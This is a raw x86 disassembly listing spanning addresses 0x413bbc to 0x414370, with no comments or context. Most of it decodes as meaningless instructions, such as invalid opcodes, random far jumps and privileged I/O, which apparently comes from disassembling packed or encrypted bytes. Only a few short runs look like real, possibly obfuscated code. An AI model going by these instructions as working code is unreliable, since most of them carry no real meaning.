  413bbc:	int    0x34
  413bbe:	and    BYTE PTR [ecx],ah
  413bc0:	push   edi
  413bc1:	aad    0xc5
  413bc3:	fild   QWORD PTR [ebx+0x46c5f3ac]
  413bc9:	mov    BYTE PTR [eax-0x1],dl
  413bcc:	sbb    eax,0x6aaf001e
  413bd1:	popa   
  413bd2:	xchg   esp,eax
  413bd3:	mov    ch,0x17
  413bd5:	pop    es
  413bd6:	out    0x65,al
  413bd8:	adc    BYTE PTR [ecx],dh
  413bda:	sahf   
  413bdb:	mov    ds:0x5bff7fb5,al
  413be0:	xchg   esp,eax
  413be1:	adc    cl,0x49
  413be4:	adc    DWORD PTR [ecx+0x7584159c],eax
  413bea:	jb     0xd63a0d46
  413bf0:	rcl    DWORD PTR [ebp-0x15f1f374],0x5e
  413bf7:	sbb    BYTE PTR [edx-0x77],0xc3
  413bfb:	pop    es
  413bfc:	cs mov dl,dh
  413bff:	mov    esi,0xfa9af91a
  413c04:	jg     0x413c76
  413c06:	inc    ebp
  413c07:	or     DWORD PTR [edi],0x2b33408b
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	jmp    FWORD PTR [eax]
  413c2b:	stos   DWORD PTR es:[edi],eax
  413c2c:	add    BYTE PTR [edx],0x0
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	aad    0x16
  413c37:	mov    edi,0xe2cdfc54
  413c3c:	mov    DWORD PTR [edi],ebx
  413c3e:	call   0x4666:0x4bed4c76
  413c45:	inc    esi
  413c46:	adc    bh,BYTE PTR [ebx-0x7f0526d8]
  413c4c:	mov    ds:0x92da318a,eax
  413c51:	enter  0x3c2b,0xe7
  413c55:	enter  0x8311,0xfa
  413c59:	pop    es
  413c5a:	call   0x3e9cc69e
  413c5f:	dec    edx
  413c60:	data16 lods al,BYTE PTR ds:[esi]
  413c62:	mul    BYTE PTR gs:[esi+0x4a3e620b]
  413c69:	seta   BYTE PTR [eax-0x1e1e8e4e]
  413c70:	cmovp  ebp,DWORD PTR [edi+ebp*1]
  413c74:	push   0xffd68f3c
  413c79:	and    esp,edi
  413c7b:	mov    cs,WORD PTR [eax-0x38]
  413c7e:	xlat   BYTE PTR ds:[ebx]
  413c7f:	fsubr  st(0),st
  413c81:	std    
  413c82:	arpl   sp,di
  413c84:	stc    
  413c85:	into   
  413c86:	pop    ecx
  413c87:	ret    0xad2e
  413c8a:	aaa    
  413c8b:	ins    BYTE PTR es:[edi],dx
  413c8c:	mov    ah,0xf7
  413c8e:	push   eax
  413c8f:	cmc    
  413c90:	push   es
  413c91:	test   al,0xf2
  413c93:	arpl   bp,cx
  413c95:	call   0x6870:0x1cef9f2d
  413c9c:	and    cl,BYTE PTR [eax]
  413c9e:	xor    eax,DWORD PTR [ecx-0x1c]
  413ca1:	int3   
  413ca2:	or     esp,DWORD PTR [ebp+0x41435265]
  413ca8:	pop    ds
  413ca9:	dec    esi
  413caa:	dec    esi
  413cab:	out    dx,eax
  413cac:	dec    edx
  413cad:	sbb    ebx,DWORD PTR [edi-0x53]
  413cb0:	inc    ebp
  413cb1:	cld    
  413cb2:	push   eax
  413cb3:	add    edi,DWORD PTR [edi+0x54354e86]
  413cb9:	jg     0x413c85
  413cbb:	aas    
  413cbc:	scas   al,BYTE PTR es:[edi]
  413cbd:	and    eax,0x5ca101d3
  413cc2:	jmp    0x413c91
  413cc4:	fucomp st(1)
  413cc6:	push   esi
  413cc7:	dec    edx
  413cc8:	jb     0x413c53
  413cca:	dec    edx
  413ccb:	loopne 0x413cac
  413ccd:	pushf  
  413cce:	outs   dx,DWORD PTR ds:[esi]
  413ccf:	xchg   ecx,eax
  413cd0:	outs   dx,BYTE PTR ds:[esi]
  413cd1:	sbb    bh,BYTE PTR [ebx]
  413cd3:	icebp  
  413cd4:	(bad)  
  413cd5:	jo     0x413c63
  413cd7:	dec    edx
  413cd8:	inc    ebp
  413cd9:	test   BYTE PTR [ebp+0x24fd18bb],bl
  413cdf:	mov    esp,0xcde8b0be
  413ce4:	xchg   ecx,eax
  413ce5:	cmc    
  413ce6:	xchg   esp,eax
  413ce7:	jp     0x413d07
  413ce9:	and    esp,0x4f1db897
  413cef:	cs and al,0xb6
  413cf2:	cmc    
  413cf3:	push   esp
  413cf4:	add    ch,BYTE PTR [esi-0x47]
  413cf7:	xchg   ebp,eax
  413cf8:	(bad)  
  413cf9:	icebp  
  413cfa:	out    0xd9,al
  413cfc:	inc    edx
  413cfd:	ret    
  413cfe:	into   
  413cff:	stos   DWORD PTR es:[edi],eax
  413d00:	add    BYTE PTR [esi],bh
  413d02:	cli    
  413d03:	icebp  
  413d04:	out    dx,eax
  413d05:	cs pop ebx
  413d07:	add    DWORD PTR [esi-0x28],esp
  413d0a:	(bad)  
  413d0b:	jmp    0x6fc371cf
  413d10:	jge    0x413cc0
  413d12:	sbb    BYTE PTR [edi+0x77],bl
  413d15:	mov    WORD PTR [edi],cs
  413d17:	mov    ah,0xc4
  413d19:	mov    ch,0x13
  413d1b:	or     ebx,DWORD PTR [esi]
  413d1d:	or     cl,BYTE PTR [edx-0x7c87ed32]
  413d23:	pop    eax
  413d24:	jb     0x413d1e
  413d26:	es sbb al,0x19
  413d29:	adc    BYTE PTR [esi+0x479f86b2],al
  413d2f:	std    
  413d30:	adc    eax,0x85c1dc01
  413d35:	stos   DWORD PTR es:[edi],eax
  413d36:	inc    edi
  413d37:	sbb    ebp,DWORD PTR [ebx]
  413d39:	das    
  413d3a:	enter  0x8a46,0x73
  413d3e:	scas   al,BYTE PTR es:[edi]
  413d3f:	cmp    BYTE PTR [edi+0xc],bl
  413d42:	idiv   BYTE PTR [bx+si+0x946]
  413d47:	out    dx,al
  413d48:	xor    dh,BYTE PTR [ebx+0x32]
  413d4b:	scas   al,BYTE PTR es:[edi]
  413d4c:	xchg   esp,eax
  413d4d:	repnz stc 
  413d4f:	es ret 0x4570
  413d53:	dec    eax
  413d54:	out    dx,al
  413d55:	xchg   esi,eax
  413d56:	retf   
  413d57:	inc    esp
  413d58:	adc    DWORD PTR [edx],esi
  413d5a:	out    dx,eax
  413d5b:	in     al,0x20
  413d5d:	jl     0x413d16
  413d5f:	push   ebp
  413d60:	nop
  413d61:	adc    bh,BYTE PTR ds:0x7cc9946a
  413d67:	lahf   
  413d68:	lock (bad) 
  413d6a:	mov    ch,0xb4
  413d6c:	jl     0x413d92
  413d6e:	mov    edi,esp
  413d70:	enter  0xff66,0xa0
  413d74:	lea    edi,[ebp-0x5de52eda]
  413d7a:	popf   
  413d7b:	out    dx,al
  413d7c:	dec    ebx
  413d7d:	cs enter 0xd0a5,0x19
  413d82:	test   BYTE PTR [esi],dl
  413d84:	cwde   
  413d85:	xchg   esi,eax
  413d86:	mov    ebp,0xdf20420a
  413d8b:	ins    BYTE PTR es:[edi],dx
  413d8c:	jg     0x413daf
  413d8e:	ret    
  413d8f:	ins    BYTE PTR es:[edi],dx
  413d90:	stc    
  413d91:	lahf   
  413d92:	and    DWORD PTR [ebx],edx
  413d94:	std    
  413d95:	lds    edi,FWORD PTR [ebx-0x79]
  413d98:	cdq    
  413d99:	jmp    0x2ea2:0x22ddb19
  413da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413da1:	add    bl,dl
  413da3:	addr16 jns 0x413d84
  413da6:	mov    edi,0x4750669f
  413dab:	cmp    ebp,edi
  413dad:	iret   
  413dae:	xor    DWORD PTR [edi-0x522b9115],edi
  413db4:	scas   eax,DWORD PTR es:[edi]
  413db5:	add    dl,ah
  413db7:	icebp  
  413db8:	data16 jp 0x413e21
  413dbb:	and    ebx,DWORD PTR [edx-0x49]
  413dbe:	jno    0x413de0
  413dc0:	fcmovu st,st(5)
  413dc2:	mov    dh,0x7a
  413dc4:	idiv   BYTE PTR [edx+0x26a55baf]
  413dca:	push   ds
  413dcb:	xor    BYTE PTR [ecx-0xf16bfcc],bh
  413dd1:	jmp    WORD PTR [ecx-0x7f]
  413dd5:	cwde   
  413dd6:	jno    0x413e4a
  413dd8:	sbb    DWORD PTR [edi],0xffffffb3
  413ddb:	loopne 0x413e3a
  413ddd:	mov    edi,eax
  413ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413de0:	test   BYTE PTR [edx-0x4d264261],ch
  413de6:	mov    eax,0x53c5e26
  413deb:	sbb    ah,BYTE PTR [ebp+0x19]
  413dee:	cmp    edi,DWORD PTR [ebp+0x12]
  413df1:	cwde   
  413df2:	ds cld 
  413df4:	(bad)  
  413df5:	int3   
  413df6:	or     edx,DWORD PTR [edi]
  413df8:	xchg   DWORD PTR cs:[ecx+0x444865e5],ebx
  413dff:	cmp    BYTE PTR [ebx],0xe7
  413e02:	pop    edx
  413e03:	inc    esp
  413e04:	idiv   DWORD PTR [esi-0x1cd18643]
  413e0a:	call   0xfdf7:0x2269b3c3
  413e11:	ins    BYTE PTR es:[edi],dx
  413e12:	adc    eax,0x373f3e61
  413e17:	cwde   
  413e18:	pusha  
  413e19:	jb     0x413e03
  413e1b:	adc    BYTE PTR [ebp-0xca04c89],ah
  413e21:	dec    esi
  413e22:	enter  0xaf8,0x7
  413e26:	(bad)  
  413e28:	lods   eax,DWORD PTR ds:[esi]
  413e29:	mov    edi,0xf64f3b55
  413e2e:	fbstp  TBYTE PTR ds:0x8468ad72
  413e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e35:	jo     0x413e8f
  413e37:	outs   dx,DWORD PTR ds:[esi]
  413e38:	in     eax,dx
  413e39:	cli    
  413e3a:	(bad)  
  413e3b:	cmp    esi,DWORD PTR [ebp+0x14e3092a]
  413e41:	push   ebp
  413e42:	pop    ds
  413e43:	call   0xb326:0xe844e5b1
  413e4a:	mov    cl,0xab
  413e4c:	sbb    eax,0x389e7f98
  413e51:	bound  ecx,QWORD PTR ds:0x7859cb91
  413e57:	rcl    BYTE PTR [esp+eiz*8-0x7dce5c5f],cl
  413e5e:	push   0x64
  413e60:	pop    ecx
  413e61:	xor    esp,eax
  413e63:	sub    al,0xc2
  413e65:	pop    esi
  413e66:	imul   edi,DWORD PTR [ebx],0xffffff9c
  413e69:	gs xchg ebp,eax
  413e6b:	jmp    0xa970:0xef7e78c6
  413e72:	rep stos BYTE PTR es:[edi],al
  413e74:	xchg   dh,dl
  413e76:	fld    TBYTE PTR [edi-0x7567e0d4]
  413e7c:	and    ebx,DWORD PTR [edx+0x3d]
  413e7f:	repnz inc edi
  413e81:	inc    eax
  413e82:	and    DWORD PTR [ecx+ebp*4-0x388bb954],ecx
  413e89:	mov    ds:0x64ef3a45,al
  413e8e:	fs nop
  413e90:	popf   
  413e91:	enter  0xbc6e,0x10
  413e95:	adc    ebp,DWORD PTR [edx-0x34]
  413e98:	iret   
  413e99:	cld    
  413e9a:	sub    ch,BYTE PTR [edi-0x4e50ba37]
  413ea0:	imul   edi,ebx
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	aad    0x3a
  413eb9:	dec    edx
  413eba:	adc    ebp,edi
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	test   DWORD PTR [edi-0x1bf38cac],esi
  413ec9:	out    dx,eax
  413eca:	sbb    al,0xd2
  413ecc:	out    dx,eax
  413ecd:	push   edx
  413ece:	jae    0x413e57
  413ed0:	pop    ds
  413ed1:	out    0x7c,al
  413ed3:	inc    ebp
  413ed4:	pop    eax
  413ed5:	icebp  
  413ed6:	imul   esi,DWORD PTR [edi-0x1e],0xa0a3b28e
  413edd:	fldenv [edx-0x10]
  413ee0:	pop    esi
  413ee1:	nop
  413ee2:	xchg   ebp,eax
  413ee3:	in     eax,0x53
  413ee5:	xor    ebx,0x7dcc36b2
  413eeb:	mov    dl,0xe9
  413eed:	inc    ecx
  413eee:	or     DWORD PTR [ecx-0x33ccead3],ecx
  413ef4:	out    dx,eax
  413ef5:	sbb    BYTE PTR ds:0xef32cc98,bh
  413efb:	dec    edx
  413efc:	fs ds jg 0x413f03
  413f00:	mov    bl,0xd4
  413f02:	add    esi,ebp
  413f04:	mov    dh,0xc5
  413f06:	mov    WORD PTR [ecx],es
  413f08:	lea    eax,[esi+0x5e]
  413f0b:	shl    BYTE PTR [ebp+0x206ec4a3],1
  413f11:	dec    esp
  413f12:	idiv   ah
  413f14:	dec    eax
  413f15:	cmp    ecx,DWORD PTR [ecx]
  413f17:	mov    ds:0xb70265a1,eax
  413f1c:	(bad)  
  413f1d:	loope  0x413f52
  413f1f:	xlat   BYTE PTR ds:[ebx]
  413f20:	ficom  WORD PTR [edi+0x44bdcfa1]
  413f26:	ficomp WORD PTR [ecx+0x3c]
  413f29:	pop    ds
  413f2a:	push   0x50e2c570
  413f2f:	outs   dx,BYTE PTR ds:[esi]
  413f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f31:	leave  
  413f32:	cmp    BYTE PTR [bp+si-0x17],dl
  413f36:	mov    ebx,0x5ff7201c
  413f3b:	cmp    eax,0xbf3aac56
  413f40:	jle    0x413f80
  413f42:	sbb    ah,dl
  413f44:	icebp  
  413f45:	cmp    edi,DWORD PTR [edx-0x52]
  413f48:	inc    ecx
  413f49:	pop    esp
  413f4a:	mov    esi,0xf0f936c0
  413f4f:	hlt    
  413f50:	cmp    al,0x57
  413f52:	xchg   DWORD PTR [edx+0x73],ecx
  413f55:	bound  edi,QWORD PTR [edi-0x667475ce]
  413f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f5c:	outs   dx,DWORD PTR ds:[esi]
  413f5d:	xor    eax,0xe982651c
  413f62:	add    BYTE PTR [ebx+eax*8],0xc1
  413f66:	rol    BYTE PTR [eax+0xbae4491],1
  413f6c:	inc    edx
  413f6d:	adc    ebp,DWORD PTR [edx-0x3dc53fba]
  413f73:	nop
  413f74:	mov    ds:0x14a6af7c,eax
  413f79:	jg     0x413f74
  413f7b:	add    bh,BYTE PTR [eax+edx*4]
  413f7e:	mov    esi,0xcd1107ef
  413f83:	or     DWORD PTR [esi],esi
  413f85:	popa   
  413f86:	or     BYTE PTR [ecx+eax*8-0x76],0xd1
  413f8b:	mov    ds:0x8e4de1ee,al
  413f90:	or     al,0x31
  413f92:	jbe    0x41400c
  413f94:	and    esi,DWORD PTR [edi-0x43]
  413f97:	jl     0x413f26
  413f99:	scas   al,BYTE PTR es:[edi]
  413f9a:	je     0x413ff6
  413f9c:	scas   eax,DWORD PTR es:[edi]
  413f9d:	mov    bl,0x61
  413f9f:	ds and al,dh
  413fa2:	mov    BYTE PTR [esi-0x2e],ah
  413fa5:	adc    eax,0x6f618b62
  413faa:	pop    eax
  413fab:	pop    ebp
  413fac:	aas    
  413fad:	push   edi
  413fae:	sahf   
  413faf:	ss std 
  413fb1:	retf   
  413fb2:	enter  0x6c94,0x78
  413fb6:	stos   BYTE PTR es:[edi],al
  413fb7:	cmp    DWORD PTR [esi+0x15],ebx
  413fba:	fidivr WORD PTR [eax+0x621bcc99]
  413fc0:	(bad)  [edi]
  413fc2:	dec    edi
  413fc3:	(bad)  
  413fc5:	mov    ecx,DWORD PTR [ebx+edi*8+0x3c]
  413fc9:	dec    eax
  413fca:	les    eax,FWORD PTR [ebx+0x19310c1a]
  413fd0:	daa    
  413fd1:	dec    ebx
  413fd2:	in     eax,dx
  413fd3:	aaa    
  413fd4:	push   0x5089a7fe
  413fd9:	push   ds
  413fda:	loop   0x413f78
  413fdc:	div    ch
  413fde:	mov    edx,0xa6d41569
  413fe3:	inc    edx
  413fe4:	adc    ch,dl
  413fe6:	push   esi
  413fe7:	stos   BYTE PTR es:[edi],al
  413fe8:	das    
  413fe9:	inc    eax
  413fea:	xchg   BYTE PTR [edi-0x6aa4eeb5],ah
  413ff0:	dec    ebp
  413ff1:	test   eax,0x9cc6e51
  413ff6:	sub    ebx,0x97cc598b
  413ffc:	lods   al,BYTE PTR ds:[esi]
  413ffd:	shl    BYTE PTR [ecx-0x5b12c4c8],cl
  414003:	inc    edx
  414004:	xor    eax,edi
  414006:	sahf   
  414007:	mov    ds:0xe89c76c5,al
  41400c:	sbb    eax,0x66c486fa
  414011:	pop    ecx
  414012:	dec    eax
  414013:	mov    ebx,0xf72b95d7
  414018:	iret   
  414019:	fisubr DWORD PTR [ecx-0x19338271]
  41401f:	lahf   
  414020:	ss int 0x35
  414023:	xor    dh,BYTE PTR [eax+0x6619f27d]
  414029:	aas    
  41402a:	loop   0x41401e
  41402c:	loop   0x41408f
  41402e:	pushf  
  41402f:	dec    ecx
  414030:	sub    BYTE PTR [ebx],dh
  414032:	je     0x414053
  414034:	dec    ebp
  414035:	mov    WORD PTR [ebx+0x23],es
  414038:	arpl   WORD PTR [esi],ax
  41403a:	push   ebx
  41403b:	fs dec edi
  41403d:	mov    ebp,0x333dba03
  414042:	mov    bh,0x56
  414044:	ficomp DWORD PTR [esi+0x5f3cfe1c]
  41404a:	sbb    BYTE PTR [edx],ah
  41404c:	xor    DWORD PTR [eax+0x56],ebp
  41404f:	out    0x85,eax
  414051:	(bad)  
  414052:	(bad)  
  414053:	es dec ebx
  414055:	or     eax,0x541a0e1d
  41405a:	push   esp
  41405b:	pop    ebx
  41405c:	mov    ds:0xd409eb6a,eax
  414061:	mov    bh,0xa5
  414063:	pop    edx
  414064:	mov    esp,0xd7bb2922
  414069:	xchg   DWORD PTR [ebp+0x6e34816f],eax
  41406f:	push   ds
  414070:	imul   esi,edi,0xffffffe4
  414073:	jb     0x4140e9
  414075:	in     al,0x19
  414077:	push   es
  414078:	sub    ebx,DWORD PTR [eax]
  41407a:	push   0xffffff91
  41407c:	jp     0x4140b8
  41407e:	stc    
  41407f:	push   cs
  414080:	or     DWORD PTR [ecx],ebp
  414082:	or     BYTE PTR [ebp+ebp*2-0xa6a9ae5],ah
  414089:	das    
  41408a:	cmp    esi,DWORD PTR [esi-0xed1f8b8]
  414090:	ss cdq 
  414092:	push   esi
  414093:	or     ebx,DWORD PTR [eax]
  414095:	sar    edx,0xa4
  414098:	adc    eax,0x602fba9
  41409d:	iret   
  41409e:	(bad)  
  41409f:	mov    edi,0x6b85bad9
  4140a4:	jp     0x4140cd
  4140a6:	xchg   edx,eax
  4140a7:	ror    DWORD PTR [ecx],cl
  4140a9:	cli    
  4140aa:	or     dh,bl
  4140ac:	adc    al,BYTE PTR [eax]
  4140ae:	repnz mov bh,0xf7
  4140b1:	sub    ebp,DWORD PTR [ebx]
  4140b3:	inc    edx
  4140b4:	fwait
  4140b5:	cmp    cl,0xc9
  4140b8:	je     0x41406a
  4140ba:	adc    BYTE PTR [ebx-0x71],dl
  4140bd:	adc    DWORD PTR [edi],esi
  4140bf:	aad    0x98
  4140c1:	jmp    0x124a745a
  4140c6:	retf   
  4140c7:	jnp    0x41405a
  4140c9:	cwde   
  4140ca:	xchg   esp,eax
  4140cb:	cld    
  4140cc:	nop
  4140cd:	ficom  DWORD PTR [esi]
  4140cf:	sub    cl,BYTE PTR fs:[ecx]
  4140d2:	pop    ss
  4140d3:	ins    BYTE PTR es:[edi],dx
  4140d4:	jp     0x4140a9
  4140d6:	jg     0x4140a4
  4140d8:	adc    ecx,DWORD PTR [ecx+edx*4-0x6a1f225b]
  4140df:	(bad)  
  4140e0:	and    eax,0xf5f26ab3
  4140e5:	data16 ss lahf 
  4140e8:	push   ecx
  4140e9:	mov    BYTE PTR [ecx],bl
  4140eb:	outs   dx,DWORD PTR ds:[esi]
  4140ec:	loopne 0x4140f9
  4140ee:	outs   dx,DWORD PTR ds:[esi]
  4140ef:	inc    ebx
  4140f0:	pushf  
  4140f1:	pop    esi
  4140f2:	rcl    DWORD PTR [esi],0xce
  4140f5:	mov    esi,0x52c4ba49
  4140fa:	ror    DWORD PTR [ecx-0x3c4174b],cl
  414100:	ficom  DWORD PTR [ebp-0x54]
  414103:	fiadd  WORD PTR [ebp-0x744538da]
  414109:	adc    eax,0xcb471a3b
  41410e:	mov    al,0x73
  414110:	cmp    dh,BYTE PTR [ebx+0x138ce281]
  414116:	(bad)  
  414117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414119:	imul   al
  41411b:	mov    ds:0xd3c09748,eax
  414120:	(bad)  
  414121:	cmp    esi,DWORD PTR [ecx+0x690daf21]
  414127:	adc    edi,edx
  414129:	jmp    0x414171
  41412b:	sahf   
  41412c:	ds push edx
  41412e:	xor    ebx,eax
  414130:	jmp    0x4143b8
  414135:	les    edi,FWORD PTR [edi]
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xd7145a14
  414142:	fs push ecx
  414144:	fcom   QWORD PTR [esp+eax*1+0x7f]
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x414187
  41414e:	ficom  WORD PTR [ecx+0x6d71b29a]
  414154:	mov    dh,BYTE PTR [edx-0x854de24]
  41415a:	xor    edx,DWORD PTR [eax]
  41415c:	jmp    0x3ec8:0xe37af66a
  414163:	das    
  414164:	lods   eax,DWORD PTR ds:[esi]
  414165:	pop    ebx
  414166:	rol    bl,1
  414168:	sbb    BYTE PTR [esp+ebx*1-0x29],ch
  41416c:	xor    al,0x1d
  41416e:	mov    eax,ds:0xef031d58
  414173:	add    esi,DWORD PTR [eax]
  414175:	or     DWORD PTR [ecx+0x1540d9e4],ecx
  41417b:	or     cl,0xad
  41417e:	jae    0x4141cb
  414180:	sub    ecx,DWORD PTR [ecx-0x7f]
  414183:	ins    DWORD PTR es:[edi],dx
  414184:	arpl   di,di
  414186:	pop    edx
  414187:	dec    edi
  414188:	lea    esp,[esi+0x58bc33b5]
  41418e:	and    ecx,ecx
  414190:	jbe    0x414172
  414192:	pop    ebx
  414193:	jl     0x4141b5
  414195:	and    DWORD PTR [edx-0x78],ebp
  414198:	and    al,0xd4
  41419a:	pop    ecx
  41419b:	stos   DWORD PTR es:[edi],eax
  41419c:	test   DWORD PTR ds:0x50ae9198,edx
  4141a2:	push   cs
  4141a3:	adc    al,0xb4
  4141a5:	hlt    
  4141a6:	dec    ecx
  4141a7:	lds    ebp,FWORD PTR [eax]
  4141a9:	adc    eax,0x5892f233
  4141ae:	mov    BYTE PTR [edx+0x23967b00],dl
  4141b4:	aad    0xb5
  4141b6:	idiv   DWORD PTR [ecx-0x9]
  4141b9:	jmp    ebx
  4141bb:	mov    DWORD PTR [esi+0x22d44a8b],edx
  4141c1:	inc    esp
  4141c2:	mov    eax,ds:0x98b9ab5c
  4141c7:	cmp    DWORD PTR [edi+eax*1],edx
  4141ca:	mov    bl,al
  4141cc:	xor    edx,DWORD PTR [edi+eax*4+0x7e767f67]
  4141d3:	inc    edi
  4141d4:	sub    al,BYTE PTR [ebp+0x5d04a55f]
  4141da:	and    al,0x2c
  4141dc:	add    DWORD PTR [ebx],ebx
  4141de:	add    al,0x6f
  4141e0:	popf   
  4141e1:	shl    cl,0x5f
  4141e4:	jmp    0x4141c7
  4141e6:	fist   DWORD PTR [edx-0x7fdc0a7d]
  4141ec:	adc    ch,BYTE PTR [ebp-0x77]
  4141ef:	mov    ds,WORD PTR [ecx]
  4141f1:	inc    edi
  4141f2:	or     eax,0x166e8612
  4141f7:	mov    dl,0x2e
  4141f9:	retf   
  4141fa:	fcomp  DWORD PTR [edi+0x16b3346b]
  414200:	js     0x4141c3
  414202:	out    0x2c,al
  414204:	and    dh,BYTE PTR [edx+eax*2+0x1e381f81]
  41420b:	jmp    0xca20:0x3d7a334e
  414212:	lea    ebp,[ecx-0x5f]
  414215:	mov    esp,0xcb926467
  41421a:	int3   
  41421b:	jne    0x41419e
  41421d:	cmp    edx,edi
  41421f:	lea    ebx,[esi]
  414221:	and    BYTE PTR [ebx],al
  414223:	adc    BYTE PTR [ecx-0x1d0fc86f],ch
  414229:	or     BYTE PTR [esi],bl
  41422b:	xlat   BYTE PTR ds:[ebx]
  41422c:	or     eax,0xa4e0b7d0
  414231:	mov    dh,0x59
  414233:	adc    esp,edi
  414235:	shl    DWORD PTR ds:0xbe7c40b3,1
  41423b:	scas   eax,DWORD PTR es:[edi]
  41423c:	sbb    al,0xd7
  41423e:	cwde   
  41423f:	mov    edi,0x5892ebb5
  414244:	cdq    
  414245:	(bad)  ds:0x7e70f58
  41424b:	lods   eax,DWORD PTR ds:[esi]
  41424c:	test   eax,0xc2390d12
  414251:	out    dx,eax
  414252:	push   ebx
  414253:	ret    
  414254:	inc    esi
  414255:	pop    ecx
  414256:	fwait
  414257:	sbb    ebp,ebx
  414259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41425a:	jne    0x41420c
  41425c:	xor    BYTE PTR [ebx],ah
  41425e:	stos   DWORD PTR es:[edi],eax
  41425f:	ror    DWORD PTR [edi],cl
  414261:	adc    bl,BYTE PTR [ebp-0x936dd15]
  414267:	dec    esp
  414268:	or     ecx,DWORD PTR [esi]
  41426a:	push   ds
  41426b:	mov    al,ds:0x8b479514
  414270:	push   ebx
  414271:	pop    ecx
  414272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414273:	jnp    0x414237
  414275:	arpl   si,cx
  414277:	int    0x4e
  414279:	mov    ah,0x38
  41427b:	rcl    DWORD PTR fs:[esi],1
  41427e:	and    ebp,DWORD PTR [eax]
  414280:	cmp    DWORD PTR [esi+0x65],esi
  414283:	test   DWORD PTR [ebp+0x13],ebp
  414286:	(bad)  
  414287:	mov    bl,0xaa
  414289:	xor    ebp,ecx
  41428b:	leave  
  41428c:	pop    ecx
  41428d:	je     0x414299
  41428f:	mov    al,ds:0x2f1b5531
  414294:	jo     0x41421d
  414296:	mul    DWORD PTR [esi]
  414298:	ds neg al
  41429b:	daa    
  41429c:	addr16 shr eax,1
  41429f:	ins    DWORD PTR es:[edi],dx
  4142a0:	add    al,0x5e
  4142a2:	fstp   QWORD PTR fs:[ebx+0x57]
  4142a6:	adc    al,0xf3
  4142a8:	stos   BYTE PTR es:[edi],al
  4142a9:	das    
  4142aa:	popf   
  4142ab:	inc    edi
  4142ac:	pop    ds
  4142ad:	aaa    
  4142ae:	inc    edi
  4142af:	push   0x472f585d
  4142b4:	xor    DWORD PTR [esi-0x37e43feb],esi
  4142ba:	cmp    cl,BYTE PTR [ecx+0x58aec24a]
  4142c0:	dec    ebp
  4142c1:	fidiv  DWORD PTR [ecx]
  4142c3:	xor    eax,DWORD PTR [ebp+0x2c5d7d85]
  4142c9:	es gs retf 
  4142cc:	fcomp  st(7)
  4142ce:	pop    ecx
  4142cf:	xor    bh,BYTE PTR [edx]
  4142d1:	imul   esi,DWORD PTR [ecx],0x4d0c9aee
  4142d7:	add    cl,dh
  4142d9:	jb     0x414300
  4142db:	fistp  QWORD PTR [ebp+0x6a]
  4142de:	add    dh,BYTE PTR [ecx+0x7305fa91]
  4142e4:	pushf  
  4142e5:	sub    al,0x40
  4142e7:	out    dx,al
  4142e8:	dec    esi
  4142e9:	(bad)  
  4142ea:	cmc    
  4142eb:	push   es
  4142ec:	xchg   edx,eax
  4142ed:	pop    ebx
  4142ee:	(bad)  
  4142ef:	f2xm1  
  4142f1:	aam    0x3c
  4142f3:	xor    bl,al
  4142f5:	not    DWORD PTR [ecx]
  4142f7:	pop    es
  4142f8:	sbb    DWORD PTR ds:0x90f1dbc8,0xfffffff8
  4142ff:	xchg   esp,eax
  414300:	daa    
  414301:	mov    al,ds:0xd27c19f6
  414306:	push   0x2a
  414308:	push   0xffffffef
  41430a:	mov    eax,0xb0e52f2
  41430f:	loope  0x41430e
  414311:	out    dx,eax
  414312:	and    eax,0x3840376b
  414317:	inc    eax
  414318:	inc    edi
  414319:	push   edi
  41431a:	cli    
  41431b:	inc    ecx
  41431c:	cmp    al,0xf7
  41431e:	ss jb  0x41435d
  414321:	inc    eax
  414322:	pop    ds
  414323:	outs   dx,BYTE PTR ds:[esi]
  414324:	fbstp  TBYTE PTR [edi]
  414326:	lea    esi,[esi-0x62]
  414329:	cmp    ebx,esp
  41432b:	mul    BYTE PTR [ebx+0x5d16321]
  414331:	into   
  414332:	add    BYTE PTR [esi],bh
  414334:	push   edx
  414335:	dec    esp
  414336:	ins    BYTE PTR es:[edi],dx
  414337:	cmc    
  414338:	and    DWORD PTR [ebx-0x7dd53fef],0x609c0666
  414342:	je     0x41436b
  414344:	fs inc ecx
  414346:	sahf   
  414347:	nop
  414348:	loop   0x41432f
  41434a:	lock int3 
  41434c:	jmp    0x41438c
  41434e:	sbb    al,0x16
  414350:	xor    BYTE PTR [edi+0x34],bl
  414353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414354:	xor    al,0xa5
  414356:	sub    DWORD PTR [ebp+0x5d],ecx
  414359:	pop    esi
  41435a:	mov    ch,0xe9
  41435c:	cli    
  41435d:	xor    ah,BYTE PTR [eax+0x4b]
  414360:	add    DWORD PTR [edx],ebx
  414362:	push   eax
  414363:	inc    esi
  414364:	sub    cl,BYTE PTR ds:0x6e6b6248
  41436a:	xchg   DWORD PTR [ebp+0x8023d38],ebp
  414370:	or     al,0x4b
